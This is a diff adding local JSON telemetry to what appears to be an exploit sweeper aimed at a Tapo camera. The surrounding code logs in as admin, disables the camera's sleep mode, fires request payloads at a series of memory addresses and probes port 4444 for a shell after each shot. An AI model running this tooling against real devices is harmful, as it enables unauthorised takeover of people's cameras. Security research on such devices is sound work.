@@ -20,6 +20,18 @@ def log(m):
     with open(LOG, "a") as f:
         f.write(time.strftime("%H:%M:%S ") + m + "\n")
 
+
+def emit(event, details):
+    """Best-effort sweeper telemetry: one JSON line, sink failure never blocks."""
+    try:
+        os.makedirs("/var/lib/fss-telemetry", exist_ok=True)
+        with open("/var/lib/fss-telemetry/sweeper-c460.jsonl", "a") as f:
+            f.write(json.dumps({"ts": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"),
+                                "cam": "c460", "event": event, "details": details},
+                               separators=(",", ":")) + "\n")
+    except OSError:
+        pass
+
 def login_once():
     r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=1)
     try:
@@ -67,6 +79,7 @@ def main():
         tries += 1
         if stok:
             log(f"DS UP (try {tries}) — disabling sleep + bursting from index {idx}")
+            emit("ds_state", {"state": "up", "tries": tries, "idx": idx})
             # disable sleep mode first (keeps camera awake for future attempts)
             subprocess.run(["bash", "deliverables/scripts/disable_tapo_sleep.sh", HOST],
                            capture_output=True, timeout=30)
@@ -79,6 +92,7 @@ def main():
                 try:
                     T.req(HOST, sess, body, timeout=8)
                     log(f"{addr:#x} fired")
+                    emit("fire", {"addr": hex(addr), "idx": idx})
                 except Exception as e:
                     log(f"{addr:#x} exc {e}")
                 # cheap shell probe between shots
@@ -86,6 +100,7 @@ def main():
                     s = socket.create_connection((HOST, 4444), timeout=1.5)
                     s.close()
                     log(f"SHELL at {addr:#x}")
+                    emit("shell", {"addr": hex(addr), "outcome": "shell"})
                     grab_and_postshell()
                     with open(STATE, "w") as f: f.write(str(idx))
                     print(json.dumps({"result": "shell", "addr": hex(addr)}))
